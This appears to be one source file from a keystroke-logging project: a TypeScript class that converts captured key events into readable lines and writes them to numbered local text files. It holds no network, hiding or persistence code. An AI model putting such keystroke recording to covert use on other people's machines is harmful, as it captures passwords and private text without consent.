// const fs = require('fs-extra')
import * as fs from 'fs-extra';
import IKeyEvent from './../types/keyEvent.interface';
import RawCodeTranslator from './rawCodeTranslator.service';

const rawCodeTranslator: RawCodeTranslator = new RawCodeTranslator();

export default class FileWriter {
    logPath: string = "./output/loggerTest";
    extenstion: string = ".txt";
    fileWritesCounter: number = 0;

    saveLogs(keysLog: IKeyEvent[]) {
        console.log("attempting to write to the file");
        const dataToSafe: any = this.converArrayOfLogsToReadableText(keysLog);
        const path: string = this.logPath + this.fileWritesCounter + this.extenstion;

        fs.writeFile(path, dataToSafe, (err) => {
            if (err) throw err;
            console.log('It\'s saved!');
        })
        this.fileWritesCounter++;
    }

    converArrayOfLogsToReadableText(keysLog: IKeyEvent[]): string {
        let result: string = '';

        // for (let i = 0; i < keysLog.length; i++) {
        keysLog.forEach((logItem) => {
            const line: string = this.buildReadableLine(logItem);
            result += line;
        })
        result = result + "\n+++\n~~All key strokes:\n" + rawCodeTranslator.translateAllChars(keysLog);
        return result;
    }

    buildReadableLine(singleKeyLog: IKeyEvent): string {
        let result: string;
        result = JSON.stringify(singleKeyLog);
        result = this.addNewLineMark(result);
        result = this.addCharAtLineBegining(result, singleKeyLog);

        return result;
    }

    addNewLineMark(line: string): string {
        const result: string = line + "\n";
        return result;
    }

    addCharAtLineBegining(text: string, originalKeyLog: IKeyEvent): string {
        const originalKeyAsChar: string = rawCodeTranslator.translateToChar(originalKeyLog.rawcode)

        const result: string = originalKeyAsChar + " " + text;
        return result;
    }
}